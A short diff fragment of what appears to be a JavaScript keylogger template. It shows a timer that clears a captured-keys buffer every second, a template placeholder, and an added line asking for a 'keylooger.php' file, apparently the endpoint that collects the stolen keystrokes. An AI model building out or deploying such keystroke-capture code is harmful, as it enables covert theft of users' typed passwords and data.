@@ -14,3 +14,5 @@ window.setInterval(function(){
   keys = '';
 }, 1000);
 %content%
+
+%option%Please Create keylooger.php%option%
